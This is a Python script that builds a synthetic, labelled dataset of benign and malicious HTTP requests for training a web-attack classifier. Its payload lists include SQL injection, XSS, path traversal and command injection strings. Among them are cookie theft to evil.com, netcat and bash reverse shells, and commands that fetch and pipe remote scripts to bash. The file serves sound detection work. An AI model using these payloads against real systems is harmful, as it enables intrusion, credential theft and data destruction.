"""
Dataset Generator  (v2 — high diversity)

Key improvement over v1:
  Massively expanded normal traffic templates (25 hosts, 40 paths,
  60+ params, 8 user agents).  This prevents the classifier from
  over-fitting to specific domain/path patterns and drastically
  reduces false positives on unseen benign traffic.
"""

import pandas as pd
import numpy as np
import random
import os
import string

random.seed(42)
np.random.seed(42)

# ── Normal traffic — highly diverse ──────────────────────────────────────────

NORMAL_HOSTS = [
    # HTTPS with ports
    "https://shop.example.com:443",
    "https://store.demo.net:443",
    "https://webapp.test.io:443",
    # HTTPS without ports
    "https://shop.example.com",
    "https://api.example.com",
    "https://cdn.example.com",
    "https://app.example.com",
    "https://blog.example.com",
    "https://docs.example.com",
    "https://accounts.example.com",
    "https://secure.bank-demo.com",
    "https://portal.university.edu",
    "https://dashboard.analytics.io",
    "https://mail.provider.net",
    # HTTP
    "http://example.com",
    "http://testsite.local:8080",
    "http://dev.internal:3000",
    "http://staging.example.com",
    "http://localhost:5000",
    "http://192.168.1.100:8080",
    # Various TLDs
    "https://mysite.co.uk",
    "https://empresa.com.br",
    "https://service.cloud.google.com",
    "https://app.herokuapp.com",
    "https://project.vercel.app",
]

NORMAL_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact",
    "/products", "/search", "/filter", "/listing", "/browse",
    "/category", "/shop", "/catalogue", "/items", "/api/v1/items",
    "/api/v2/users", "/api/v1/orders", "/dashboard", "/settings",
    "/profile", "/account", "/login", "/register", "/logout",
    "/help", "/faq", "/terms", "/privacy", "/support",
    "/blog", "/posts", "/articles", "/news", "/feed",
    "/download", "/upload", "/files", "/images", "/assets",
    "/checkout", "/cart", "/wishlist", "/reviews", "/ratings",
    "/notifications", "/messages", "/inbox", "/calendar",
    "/reports", "/analytics", "/export", "/import",
    "/wp-content/themes/flavor/style.css",
    "/static/js/main.bundle.js",
    "/favicon.ico",
]

NORMAL_PARAMS = [
    # Single params
    "category=Gifts", "category=Accessories", "category=Pets",
    "category=Tech+gifts", "category=All", "category=Books",
    "category=Clothing", "category=Electronics", "category=Furniture",
    "category=Sports", "category=Toys", "category=Garden",
    "category=Home+%26+Living", "category=Food+%26+Drink",
    "q=hello+world", "q=blue+shoes", "q=laptop+bag",
    "q=wireless+headphones", "q=birthday+gifts+for+mom",
    "q=python+programming+book", "q=summer+dresses+2024",
    "id=1", "id=42", "id=100", "id=99999",
    "page=1", "page=5", "page=10",
    "lang=en", "lang=en-GB", "lang=fr", "lang=de", "lang=ja",
    "format=json", "format=xml", "format=csv",
    "ref=homepage", "ref=google", "ref=newsletter",
    "source=organic", "source=paid", "source=social",
    "token=abc123def456", "token=xyz789pqr",
    "code=AUTH_CODE_4x7F2k9", "state=random_state_abc",
    "",  # empty params (navigating without query)
    "",
    "",  # weight empty params more to match real traffic
    "",
    "",
    # Multi params
    "page=2&sort=asc", "page=3&sort=desc&per_page=20",
    "limit=10&offset=0", "limit=20&offset=40", "limit=50&offset=100",
    "sort=price&order=asc", "sort=name&order=desc",
    "sort=date&order=desc&filter=active",
    "name=Alice&email=alice%40example.com",
    "name=John+Doe&email=john%40example.com&phone=555-1234",
    "user=john&role=viewer", "user=admin&role=editor",
    "v=2&client=web", "v=3&client=mobile&platform=ios",
    "start=2024-01-01&end=2024-12-31",
    "lat=51.5074&lon=-0.1278", "lat=40.7128&lon=-74.0060",
    "width=800&height=600&quality=85",
    "type=image&format=webp&size=medium",
    "utm_source=google&utm_medium=cpc&utm_campaign=spring_sale",
    "tab=overview&section=billing",
    "min_price=10&max_price=100&currency=USD",
    "color=red&size=XL&material=cotton",
    "from=inbox&read=false&starred=true",
    "status=active&verified=true",
    "fields=name,email,phone&include=address",
]

NORMAL_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Safari/605.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) Safari/605.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0",
    "PostmanRuntime/7.35.0",
    "python-requests/2.31.0",
]

NORMAL_HEADERS_EXTRA = [
    "Accept: text/html,application/xhtml+xml",
    "Accept: application/json",
    "Accept-Language: en-US,en;q=0.9",
    "Accept-Encoding: gzip, deflate, br",
    "Connection: keep-alive",
    "Cache-Control: no-cache",
    "X-Requested-With: XMLHttpRequest",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
    "Content-Type: application/x-www-form-urlencoded",
    "Content-Type: application/json",
    "Referer: https://shop.example.com/",
    "Origin: https://shop.example.com",
    "Cookie: session=abc123; theme=dark",
    "X-Forwarded-For: 192.168.1.100",
]

# ── Attack payloads ──────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users;--",
    "1 UNION SELECT null,username,password FROM users--",
    "admin'--", "' OR 'x'='x",
    "1; SELECT * FROM information_schema.tables",
    "' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
    "' OR SLEEP(5)--", "1 OR 1=1",
    "'; EXEC xp_cmdshell('whoami');--",
    "1' AND (SELECT COUNT(*) FROM users)>0--",
    "' OR '1'='1'--", "1; SELECT @@version--",
    "' UNION SELECT null--", "admin' #",
    "1' ORDER BY 10--", "' HAVING 1=1--",
    "1' AND BENCHMARK(10000000,SHA1('test'))--",
    "' UNION SELECT null,null,CONCAT(username,0x3a,password) FROM users--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    '"><script>document.location="http://evil.com"</script>',
    "<body onload=alert('xss')>",
    "';alert('XSS');//",
    "<iframe src=javascript:alert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<IMG SRC=j&#X41vascript:alert('XSS')>",
    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
    "<input onfocus=alert(1) autofocus>",
    "<div onmouseover=alert('XSS')>hover</div>",
    "<a href=javascript:alert(1)>click</a>",
    "'-alert(1)-'",
]

CMD_PAYLOADS = [
    "; ls -la", "| cat /etc/passwd", "&& whoami",
    "`id`", "$(whoami)", "; wget http://evil.com/shell.sh",
    "| nc -e /bin/sh 10.0.0.1 4444",
    "; curl http://attacker.com/$(whoami)",
    "|| ping -c 3 attacker.com",
    "; python -c 'import os; os.system(\"id\")'",
    ";cat+/etc/passwd", "|whoami", "&&id",
    "; rm -rf /tmp/*", "; chmod 777 /etc/shadow",
    "| nmap -sV 192.168.1.0/24",
    "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "$(curl evil.com/shell.sh | bash)",
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fshadow",
    "....//....//etc/passwd",
    "/var/www/../../etc/passwd",
    "C:\\Windows\\system32\\cmd.exe",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "../../../../etc/hosts",
    "%252e%252e%252fetc%252fpasswd",
    "../../../../proc/self/environ",
    "..%5c..%5c..%5cwindows%5csystem32%5ccmd.exe",
    "....\\\\....\\\\etc/passwd",
]

# ── Builders ─────────────────────────────────────────────────────────────────

def _make_normal():
    host   = random.choice(NORMAL_HOSTS)
    path   = random.choice(NORMAL_PATHS)
    params = random.choice(NORMAL_PARAMS)
    url    = f"{host}{path}" + (f"?{params}" if params else "")
    method = random.choice(["GET", "GET", "GET", "GET", "POST", "PUT",
                             "PATCH", "DELETE"])
    # Build varied headers
    ua  = random.choice(NORMAL_AGENTS)
    hdr = f"Host: {host}\r\nUser-Agent: {ua}"
    # Occasionally add extra headers
    if random.random() < 0.4:
        hdr += "\r\n" + random.choice(NORMAL_HEADERS_EXTRA)
    if random.random() < 0.2:
        hdr += "\r\n" + random.choice(NORMAL_HEADERS_EXTRA)
    return {
        "url":     url,
        "params":  params,
        "headers": hdr,
        "method":  method,
        "label":   "normal",
    }

def _make_sqli():
    host    = random.choice(NORMAL_HOSTS)
    path    = random.choice(NORMAL_PATHS)
    payload = random.choice(SQLI_PAYLOADS)
    param   = random.choice(["id", "category", "search", "page", "user",
                              "q", "username", "email", "item", "order"])
    params  = f"{param}={payload}"
    ua      = random.choice(["sqlmap/1.7", "sqlmap/1.8",
                               random.choice(NORMAL_AGENTS)])
    return {
        "url":     f"{host}{path}?{params}",
        "params":  params,
        "headers": f"Host: {host}\r\nUser-Agent: {ua}",
        "method":  random.choice(["GET", "POST"]),
        "label":   "sqli",
    }

def _make_xss():
    host    = random.choice(NORMAL_HOSTS)
    path    = random.choice(NORMAL_PATHS)
    payload = random.choice(XSS_PAYLOADS)
    param   = random.choice(["q", "search", "category", "name", "comment",
                              "message", "title", "input", "redirect", "url"])
    params  = f"{param}={payload}"
    return {
        "url":     f"{host}{path}?{params}",
        "params":  params,
        "headers": f"Host: {host}\r\nUser-Agent: {random.choice(NORMAL_AGENTS)}",
        "method":  random.choice(["GET", "POST"]),
        "label":   "xss",
    }

def _make_cmdi():
    host    = random.choice(NORMAL_HOSTS)
    path    = random.choice(["/ping", "/exec", "/run", "/filter", "/search",
                              "/api/v1/check", "/health", "/diagnose", "/test"])
    payload = random.choice(CMD_PAYLOADS)
    base    = random.choice(["category=Gifts", "host=127.0.0.1",
                              "input=test", "target=localhost", "cmd=check"])
    params  = f"{base}{payload}"
    return {
        "url":     f"{host}{path}?{params}",
        "params":  params,
        "headers": f"Host: {host}\r\nUser-Agent: {random.choice(NORMAL_AGENTS)}",
        "method":  random.choice(["GET", "POST"]),
        "label":   "cmdi",
    }

def _make_traversal():
    host    = random.choice(NORMAL_HOSTS)
    payload = random.choice(TRAVERSAL_PAYLOADS)
    param   = random.choice(["file", "path", "page", "template",
                              "include", "doc", "img", "src"])
    params  = f"{param}={payload}"
    path    = random.choice(["/download", "/read", "/view", "/include",
                              "/file", "/load", "/fetch", "/get"])
    return {
        "url":     f"{host}{path}?{params}",
        "params":  params,
        "headers": f"Host: {host}\r\nUser-Agent: {random.choice(NORMAL_AGENTS)}",
        "method":  "GET",
        "label":   "traversal",
    }

# ── Public API ───────────────────────────────────────────────────────────────

GENERATORS = {
    "normal":    _make_normal,
    "sqli":      _make_sqli,
    "xss":       _make_xss,
    "cmdi":      _make_cmdi,
    "traversal": _make_traversal,
}

def generate_dataset(n_per_class: int = 600) -> pd.DataFrame:
    records = []
    for label, fn in GENERATORS.items():
        for _ in range(n_per_class):
            records.append(fn())
    random.shuffle(records)
    return pd.DataFrame(records)


if __name__ == "__main__":
    out_dir = os.path.join(os.path.dirname(__file__), "..", "data")
    os.makedirs(out_dir, exist_ok=True)
    df = generate_dataset(n_per_class=600)
    path = os.path.join(out_dir, "synthetic_dataset.csv")
    df.to_csv(path, index=False)
    print(f"Dataset saved: {path}  ({len(df)} rows)")
    print(df["label"].value_counts())
